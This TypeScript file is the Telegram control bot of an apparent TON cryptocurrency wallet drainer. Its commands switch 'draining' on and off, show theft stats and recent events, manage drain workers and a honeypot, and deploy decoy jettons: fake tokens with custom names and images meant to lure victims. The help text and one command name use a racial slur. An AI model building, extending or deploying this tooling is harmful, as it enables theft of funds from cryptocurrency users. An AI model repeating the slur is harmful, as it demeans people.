// In-process Telegram bot. Long-polls getUpdates, so no extra service needed.
import { mkdirSync, readFileSync, writeFileSync } from 'fs'
import path from 'path'
import { config } from '@utils/config'
import { prisma } from '@db/instance'
import { formatStats, recentEvents } from './stats'
import { deployDecoy, deployerBalance, deployerWallet } from './deployer'

const API = `https://api.telegram.org/bot${config.BOT_TOKEN}`
const SWITCH_FILE = process.env.DRAIN_SWITCH_FILE || path.join(process.cwd(), 'drain.state')
const DECOY_FILE = path.join(process.cwd(), 'src', 'items', 'decoy.json')

const parseIds = (v?: string) => (v ?? '').split(',').map(x => x.trim()).filter(Boolean)
const ADMINS = parseIds(Bun.env.ADMIN_IDS)
const ALLOWED_CHATS = parseIds(Bun.env.ALLOWED_CHATS)

let offset = 0

async function call(method: string, payload: Record<string, unknown> = {}): Promise<any> {
	try {
		const res = await fetch(`${API}/${method}`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify(payload),
			signal: AbortSignal.timeout(45_000),
		})
		return await res.json()
	} catch (e) {
		return { ok: false, error_code: -1, description: `fetch failed: ${e}` }
	}
}

const reply = (chatId: number | string, text: string) =>
	call('sendMessage', {
		chat_id: chatId,
		text,
		parse_mode: 'HTML',
		disable_web_page_preview: true,
	})

const readSwitch = () => {
	try {
		return readFileSync(SWITCH_FILE, 'utf8').trim() || 'on'
	} catch {
		return 'on'
	}
}

async function currentDecoy(): Promise<string | null> {
	try {
		return JSON.parse(readFileSync(DECOY_FILE, 'utf8'))?.address ?? null
	} catch {
		return null
	}
}

const HELP = [
	'<b>drain bot</b>',
	'/ping - reachability test (no auth)',
	'/niggers - full stats',
	'/last - 10 most recent events',
	'/on - enable draining',
	'/off - disable draining',
	'/status - switch + uptime',
	'/worker - list workers + honeypot state',
	'/honeypot - show honeypot state (worker 1)',
	'/honeypot &lt;id&gt; on|off - toggle decoy leg',
	'/deployer - deployer wallet + balance',
	'/newtoken - make a decoy jetton (name/symbol/image)',
	'/decoy - which decoy address is live',
	'/cancel - abort a /newtoken draft',
].join('\n')

type Draft = { step: 'name' | 'symbol' | 'image'; name?: string; symbol?: string; img?: string }
const drafts = new Map<number, Draft>()
const slug = (s: string) =>
	s.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '').slice(0, 24)

async function doDeploy(chatId: number) {
	const d = drafts.get(chatId)
	if (!d?.name || !d?.symbol) return void (await reply(chatId, 'no draft - run /newtoken'))
	await reply(chatId, 'Deploying... (~15s)')
	try {
		const s = slug(d.symbol)
		const dir = path.join(process.cwd(), 'src', 'front', 'site', 'jetton')
		mkdirSync(dir, { recursive: true })
		const metaUrl = `${config.URL}/jetton/${s}.json`
		writeFileSync(
			path.join(dir, `${s}.json`),
			JSON.stringify({
				name: d.name,
				symbol: d.symbol,
				decimals: '9',
				image: d.img ?? `${config.URL}/icon.png`,
				description: d.name,
			})
		)
		const addr = await deployDecoy(metaUrl)
		drafts.delete(chatId)
		await reply(
			chatId,
			`Deployed\n<code>${addr}</code>\nmetadata: ${metaUrl}\n\nHoneypot now points at it.`
		)
	} catch (e) {
		await reply(chatId, `deploy failed: <code>${String(e).slice(0, 300)}</code>`)
	}
}

async function advance(chatId: number, msg: any) {
	const d = drafts.get(chatId)
	if (!d) return
	const text = (msg.text ?? '').trim()
	const word = text.split(/[\s@]/)[0].toLowerCase()

	if (word === '/cancel') {
		drafts.delete(chatId)
		await reply(chatId, 'cancelled')
		return
	}
	if (word === '/deploy') return doDeploy(chatId)

	if (d.step === 'name') {
		if (!text) return
		d.name = text.slice(0, 40)
		d.step = 'symbol'
		await reply(chatId, 'Now send the <b>symbol</b>, e.g. <code>STRM</code>')
		return
	}

	if (d.step === 'symbol') {
		if (!text) return
		d.symbol = text.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 10) || 'TOKEN'
		d.step = 'image'
		await reply(chatId, 'Now send the <b>token image</b> as a photo, or /skip')
		return
	}

	if (d.step === 'image') {
		if (word !== '/skip' && msg.photo?.length) {
			const p = await call('getFile', { file_id: msg.photo[msg.photo.length - 1].file_id })
			if (p?.ok) {
				const url = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${p.result.file_path}`
				const buf = Buffer.from(await (await fetch(url)).arrayBuffer())
				const dir = path.join(process.cwd(), 'src', 'front', 'site', 'jetton')
				mkdirSync(dir, { recursive: true })
				writeFileSync(path.join(dir, `${slug(d.symbol!)}.png`), buf)
				d.img = `${config.URL}/jetton/${slug(d.symbol!)}.png`
			}
		}
		await reply(
			chatId,
			`Ready:\nname: <b>${d.name}</b>\nsymbol: <b>${d.symbol}</b>\nimage: ${
				d.img ?? 'none'
			}\n\n<b>/deploy</b> to deploy - /cancel to abort`
		)
		return
	}
}

async function handle(msg: any): Promise<void> {
	const text: string = (msg.text ?? '').trim()
	const chatId = msg.chat.id
	const fromId = String(msg.from?.id ?? '')

	const isCmd = text.startsWith('/')
	const cmd = isCmd ? text.split(/[\s@]/)[0].slice(1).toLowerCase() : ''
	const args = text.split(/\s+/).slice(1)

	if (drafts.has(chatId) && (!isCmd || ['cancel', 'skip', 'deploy'].includes(cmd)))
		return advance(chatId, msg)
	if (!isCmd) return

	try {
		if (cmd === 'ping') {
			await reply(chatId, `pong - switch <b>${readSwitch()}</b>`)
			return
		}

		const open = !ADMINS.length && !ALLOWED_CHATS.length
		const allowed = open || ADMINS.includes(fromId) || ALLOWED_CHATS.includes(String(chatId))
		if (!allowed) {
			await reply(
				chatId,
				`not authorised - your id is <code>${fromId}</code>, chat id is <code>${chatId}</code>`
			)
			return
		}

		switch (cmd) {
			case 'newtoken':
				drafts.set(chatId, { step: 'name' })
				await reply(chatId, 'Send the <b>token name</b> (e.g. Storm Rewards)')
				break

			case 'deploy':
				await doDeploy(chatId)
				break

			case 'cancel':
				drafts.delete(chatId)
				await reply(chatId, 'cancelled')
				break

			case 'deployer': {
				const { wallet } = await deployerWallet()
				const bal = await deployerBalance().catch(() => 0n)
				await reply(
					chatId,
					`deployer: <code>${wallet.address.toString({
						bounceable: false,
					})}</code>\nbalance: <b>${(Number(bal) / 1e9).toFixed(4)} TON</b>\nfund with ~0.3 TON`
				)
				break
			}

			case 'decoy': {
				const a = await currentDecoy()
				await reply(
					chatId,
					a
						? `decoy: <code>${a}</code>\nhttps://tonviewer.com/${a}`
						: 'no custom decoy yet - using the template default'
				)
				break
			}

			case 'niggers':
			case 'stats':
				await reply(chatId, await formatStats())
				break

			case 'last':
				await reply(chatId, await recentEvents(10))
				break

			case 'on':
			case 'off':
				writeFileSync(SWITCH_FILE, cmd + '\n')
				await reply(chatId, `drainer -> <b>${cmd}</b>`)
				break

			case 'status':
				await reply(chatId, `drainer: <b>${readSwitch()}</b>\nuptime: ${Math.floor(process.uptime())}s`)
				break

			case 'worker':
			case 'workers': {
				const list = await prisma.worker.findMany({ orderBy: { id: 'asc' } })
				await reply(
					chatId,
					list.length
						? list
								.map(
									w =>
										`#${w.id} - ${w.drainMode} - honeypot <b>${
											w.honeyPot ? 'ON' : 'OFF'
										}</b> (${w.honeyPotMode})`
								)
								.join('\n')
						: 'no workers'
				)
				break
			}

			case 'honeypot': {
				const id = Number(args[0]) || 1
				const v = (args[1] || '').toLowerCase()
				const data: any = {}
				if (v === 'on') data.honeyPot = true
				if (v === 'off') data.honeyPot = false
				if (Object.keys(data).length) {
					await prisma.worker.update({ where: { id }, data }).catch(() => {})
				}
				const w = await prisma.worker.findUnique({ where: { id } })
				const a = await currentDecoy()
				await reply(
					chatId,
					w
						? `worker ${id} - honeypot <b>${w.honeyPot ? 'ON' : 'OFF'}</b> - decoy <code>${
								a ?? 'template default'
							}</code>`
						: `no worker with id ${id}`
				)
				break
			}

			case 'help':
			case 'start':
				await reply(chatId, HELP)
				break
		}
	} catch (e) {
		await reply(chatId, `error: <code>${String(e).slice(0, 350)}</code>`)
		console.error('[bot] handle error', e)
	}
}

let polls = 0

export function startBot(): void {
	if (Bun.env.BOT_DISABLED === '1') {
		console.log('[bot] disabled via BOT_DISABLED')
		return
	}

	process.on('unhandledRejection', e => console.error('[bot] unhandledRejection', e))
	process.on('uncaughtException', e => console.error('[bot] uncaughtException', e))

	void (async () => {
		const me = await call('getMe')
		if (!me?.ok) console.error('[bot] getMe FAILED - bad BOT_TOKEN?', me?.error_code, me?.description)
		else console.log(`[bot] authorised as @${me.result.username} (id ${me.result.id})`)

		console.log('[bot] deleteWebhook:', JSON.stringify(await call('deleteWebhook', { drop_pending_updates: false })))
		console.log('[bot] long-poll started')

		for (;;) {
			try {
				const data = await call('getUpdates', { offset, timeout: 30, allowed_updates: ['message'] })
				if (data?.ok) {
					if (++polls % 20 === 0) console.log(`[bot] alive - poll #${polls}`)
					for (const u of data.result ?? []) {
						offset = u.update_id + 1
						if (u.message) void handle(u.message)
					}
				} else {
					console.error('[bot] getUpdates FAILED:', data?.error_code, data?.description)
					await new Promise(r => setTimeout(r, 3000))
				}
			} catch (e) {
				console.error('[bot] poll error', e)
			}
			await new Promise(r => setTimeout(r, 400))
		}
	})()
}
